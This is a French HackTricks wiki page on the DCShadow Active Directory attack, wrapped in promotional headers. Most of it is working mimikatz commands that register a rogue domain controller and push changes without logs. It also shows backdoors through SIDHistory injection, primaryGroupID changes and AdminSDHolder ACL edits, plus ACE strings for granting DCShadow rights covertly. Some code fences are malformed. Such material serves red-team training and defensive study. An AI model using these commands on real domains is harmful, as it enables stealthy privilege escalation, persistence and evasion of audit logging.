<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# DCShadow

Il enregistre un **nouveau Contrôleur de Domaine** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **avez besoin de privilèges DA** et d'être dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des logs assez laids apparaîtront.

Pour effectuer l'attaque, vous avez besoin de 2 instances de mimikatz. L'une d'elles démarrera les serveurs RPC avec des privilèges SYSTEM (vous devez indiquer ici les changements que vous souhaitez effectuer), et l'autre instance sera utilisée pour pousser les valeurs :

{% code title="mimikatz1 (serveurs RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Nécessite DA ou similaire" %}
```bash
lsadump::dcshadow /push
```
```markdown
{% endcode %}

Remarquez que **`elevate::token`** ne fonctionnera pas dans une session mimikatz1 car cela élève les privilèges du thread, mais nous devons élever **le privilège du processus**.\
Vous pouvez également sélectionner un objet "LDAP" : `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Vous pouvez pousser les changements depuis un DA ou depuis un utilisateur avec ces permissions minimales :

* Dans **l'objet domaine** :
* _DS-Install-Replica_ (Ajouter/Retirer une Réplique dans le Domaine)
* _DS-Replication-Manage-Topology_ (Gérer la Topologie de Réplication)
* _DS-Replication-Synchronize_ (Synchronisation de la Réplication)
* L'**objet Sites** (et ses enfants) dans le **conteneur Configuration** :
* _CreateChild et DeleteChild_
* L'objet de **l'ordinateur enregistré en tant que DC** :
* _WriteProperty_ (Pas Write)
* L'**objet cible** :
* _WriteProperty_ (Pas Write)

Vous pouvez utiliser [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) pour donner ces privilèges à un utilisateur non privilégié (remarquez que cela laissera des traces dans les logs). C'est beaucoup plus restrictif que d'avoir des privilèges DA.\
Par exemple : `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Cela signifie que l'utilisateur _**student1**_ lorsqu'il est connecté sur la machine _**mcorp-student1**_ a des permissions DCShadow sur l'objet _**root1user**_.

## Utiliser DCShadow pour créer des portes dérobées

{% code title="Ajouter les Enterprise Admins dans SIDHistory à un utilisateur" %}
```
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Changer PrimaryGroupID (mettre l'utilisateur comme membre des Administrateurs du Domaine)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modifier le ntSecurityDescriptor de AdminSDHolder (donner un contrôle total à un utilisateur)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
```markdown
{% endcode %}

## Shadowception - Donner des permissions DCShadow en utilisant DCShadow (sans logs de permissions modifiées)

Nous devons ajouter les ACEs suivantes avec le SID de notre utilisateur à la fin :

* Sur l'objet domaine :
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Sur l'objet ordinateur de l'attaquant : `(A;;WP;;;UserSID)`
* Sur l'objet utilisateur cible : `(A;;WP;;;UserSID)`
* Sur l'objet Sites dans le conteneur Configuration : `(A;CI;CCDC;;;UserSID)`

Pour obtenir l'ACE actuel d'un objet : `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Notez que dans ce cas, vous devez faire **plusieurs changements,** pas seulement un. Donc, dans la **session mimikatz1** (serveur RPC) utilisez le paramètre **`/stack` avec chaque changement** que vous souhaitez effectuer. De cette façon, vous aurez seulement besoin de **`/push`** une fois pour exécuter tous les changements accumulés dans le serveur rogue.



[**Plus d'informations sur DCShadow sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PRs aux repos github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
